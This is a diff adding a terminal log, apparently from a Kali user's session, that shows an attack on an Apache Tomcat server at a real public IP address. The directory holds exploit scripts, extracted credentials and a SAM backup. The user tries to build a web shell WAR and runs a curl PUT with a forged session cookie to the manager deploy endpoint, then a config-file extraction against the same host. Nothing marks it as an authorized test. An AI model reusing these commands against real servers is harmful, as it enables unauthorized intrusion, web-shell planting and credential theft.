@@ -1,0 +1,141 @@
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ python scPrediccion2.py 
+                                                                                        
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ python3 scPrediccion2.py
+                                                                                        
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ ls
+advanced_decode.py     extracted_creds.txt  scan_results.txt   ultimate_attack.sh
+backdoor_analysis.js   extracted_words.txt  scPrediccion2.py   windows_paths.txt
+backdoor_decoded.txt   final_attack.sh      scPrediccion.py    windows_scan.txt
+deep_decode.js         jsp_analysis.txt     tomcat_audit.sh
+detected_keycodes.txt  keycodes.txt         tomcat_exploit.sh
+
+SAM_BACKUP.BIN
+<html>
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+
+<body bgcolor="white">
+
+<font color="red">
+
+
+
+<p>In place evaluation of another JSP which gives you the current time:
+
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+
+<body bgcolor="white">
+<font color="red">
+
+1760056154120
+
+
+<p> <!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+To get the current time in ms
+ by including the output of another JSP:
+
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+
+<body bgcolor="white">
+<font color="red">
+
+1760056154135
+
+
+:-) 
+
+</html>
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/shell]
+└─$ jar -cvf ../shell.war *
+Orden «jar» no encontrada. Quizá quiso decir:
+  la orden «ar» del paquete deb «binutils»
+  la orden «bar» del paquete deb «bar»
+  la orden «par» del paquete deb «par»
+  la orden «rar» del paquete deb «rar»
+  la orden «xar» del paquete deb «xar»
+  la orden «kar» del paquete deb «sra-toolkit»
+  la orden «tar» del paquete deb «tar»
+  la orden «dar» del paquete deb «dar»
+  la orden «car» del paquete deb «ucommon-utils»
+  la orden «javr» del paquete deb «xc3sprog»
+Pruebe con: sudo apt install <nombre del paquete deb>
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/shell]
+└─$ curl -k -b "JSESSIONID=00000000000000000000000000000000" \
+     -X PUT \
+     --upload-file shell.war \
+     "https://189.254.143.102/manager/deploy?path=/shell"
+curl: cannot open 'shell.war'
+curl: try 'curl --help' or 'curl --manual' for more information
+curl: (26) Failed to open/read local data from file/application
+
+=== EXTRACTING CONFIG FILES ===
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '189.254.143.102'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '189.254.143.102'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '189.254.143.102'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
